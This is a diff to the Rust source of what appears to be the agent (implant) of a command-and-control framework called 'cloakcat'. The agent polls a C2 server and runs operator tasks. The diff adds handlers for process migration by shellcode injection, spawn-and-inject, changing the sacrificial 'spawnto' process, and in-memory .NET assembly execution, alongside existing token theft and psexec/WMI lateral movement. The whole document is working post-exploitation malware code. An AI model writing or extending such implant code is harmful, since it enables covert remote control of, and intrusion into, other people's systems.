@@ -14,8 +14,9 @@ use anyhow::Context;
 use base64::Engine;
 use cloakcat_protocol::{
     profile_by_name, sign_result, BofTask, Command, DerivedKeys, DownloadTask, Endpoints,
-    InjectTask, JumpPsexecTask, JumpWmiTask, MakeTokenTask, PollResponse, RemoteExecTask,
-    ResultReq, ShinjectTask, SpawnInjectTask, StealTokenTask, TaskType, TunnelAction, UploadTask,
+    ExecuteAssemblyTask, InjectTask, JumpPsexecTask, JumpWmiTask, MakeTokenTask,
+    MigrateTask, PollResponse, RemoteExecTask, ResultReq, SetSpawnToTask, ShinjectTask,
+    SpawnInjectTask, SpawnTask, StealTokenTask, TaskType, TunnelAction, UploadTask,
 };
 use rand::Rng;
 use tokio::time::sleep;
@@ -71,7 +72,7 @@ async fn dispatch_task<T: Transport>(
     auth_token: &str,
     cmd: &Command,
     token_state: &mut tasks::token::TokenState,
-    spawn_process: Option<&str>,
+    spawn_process: &mut Option<String>,
 ) -> anyhow::Result<(i32, String, String)> {
     match cmd.task_type {
         TaskType::Shell => run_command(cmd).await,
@@ -154,7 +155,39 @@ async fn dispatch_task<T: Transport>(
             let shellcode = base64::engine::general_purpose::STANDARD
                 .decode(&task.shellcode_b64)
                 .context("bad shellcode base64")?;
-            tasks::inject::spawn_inject(&shellcode, task.spawn_exe.as_deref(), spawn_process)
+            tasks::inject::spawn_inject(&shellcode, task.spawn_exe.as_deref(), spawn_process.as_deref())
+        }
+        TaskType::Migrate => {
+            let task: MigrateTask = serde_json::from_str(&cmd.command)
+                .context("bad MigrateTask payload")?;
+            let shellcode = base64::engine::general_purpose::STANDARD
+                .decode(&task.shellcode_b64)
+                .context("bad shellcode base64")?;
+            // migrate: inject into target, then ExitProcess (on Windows).
+            tasks::inject::migrate(task.pid, &shellcode)
+        }
+        TaskType::Spawn => {
+            let task: SpawnTask = serde_json::from_str(&cmd.command)
+                .context("bad SpawnTask payload")?;
+            let shellcode = base64::engine::general_purpose::STANDARD
+                .decode(&task.shellcode_b64)
+                .context("bad shellcode base64")?;
+            tasks::inject::spawn_inject(&shellcode, task.spawn_exe.as_deref(), spawn_process.as_deref())
+        }
+        TaskType::SetSpawnTo => {
+            let task: SetSpawnToTask = serde_json::from_str(&cmd.command)
+                .context("bad SetSpawnToTask payload")?;
+            let old = spawn_process.as_deref().unwrap_or(tasks::inject::DEFAULT_SPAWN_PROCESS).to_string();
+            *spawn_process = Some(task.path.clone());
+            Ok((0, format!("[*] spawnto changed: '{}' → '{}'", old, task.path), String::new()))
+        }
+        TaskType::ExecuteAssembly => {
+            let task: ExecuteAssemblyTask = serde_json::from_str(&cmd.command)
+                .context("bad ExecuteAssemblyTask payload")?;
+            let asm_bytes = base64::engine::general_purpose::STANDARD
+                .decode(&task.assembly_b64)
+                .context("bad assembly base64")?;
+            tasks::assembly::execute_assembly(asm_bytes, task.args).await
         }
     }
 }
@@ -242,6 +275,7 @@ pub async fn run() -> anyhow::Result<()> {
         .unwrap_or(60_000);
     let mut backoff_ms: Option<u64> = None;
     let mut token_state = tasks::token::TokenState::new();
+    let mut spawn_process: Option<String> = cfg.spawn_process.clone();
 
     loop {
         let url = format!("{}?hold=45", endpoints.poll);
@@ -317,7 +351,7 @@ pub async fn run() -> anyhow::Result<()> {
         };
         debug_log!("[agent] poll: got cmd id={} type={:?}", cmd.cmd_id, cmd.task_type);
 
-        let (exit_code, stdout, stderr) = match dispatch_task(&transport, &cfg.c2_url, &agent_id, &auth_token, &cmd, &mut token_state, cfg.spawn_process.as_deref()).await {
+        let (exit_code, stdout, stderr) = match dispatch_task(&transport, &cfg.c2_url, &agent_id, &auth_token, &cmd, &mut token_state, &mut spawn_process).await {
             Ok(triple) => triple,
             Err(e) => {
                 debug_log!("[agent] task error: {e} -> send minimal result");
